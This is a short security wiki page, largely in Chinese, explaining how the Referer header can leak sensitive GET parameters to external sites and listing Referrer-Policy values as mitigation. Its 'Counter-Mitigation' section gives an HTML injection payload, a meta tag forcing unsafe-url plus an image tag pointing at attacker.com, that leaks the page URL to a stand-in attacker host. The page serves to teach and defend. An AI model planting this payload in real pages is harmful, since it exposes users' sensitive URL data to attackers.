# Interesting HTTP

{{#include ../banners/hacktricks-training.md}}

## Referrer headers and policy

Referrer 是浏览器用于指示之前访问过的页面的 header。

### Sensitive information leaked

如果网页中的某个 GET request 参数包含敏感信息，且该页面包含指向外部来源的链接，或者攻击者能够诱导/建议（social engineering）用户访问由攻击者控制的 URL，则攻击者可能通过最新的 GET request 外泄敏感信息。

### Mitigation

你可以让浏览器遵循 **Referrer-policy**，从而**避免**将敏感信息发送到其他 web 应用程序：
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
### Counter-Mitigation

你可以使用 HTML meta tag 覆盖此规则（攻击者需要利用 HTML injection）：
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## 防御

永远不要将任何敏感数据放入 URL 中的 GET 参数或路径。

{{#include ../banners/hacktricks-training.md}}
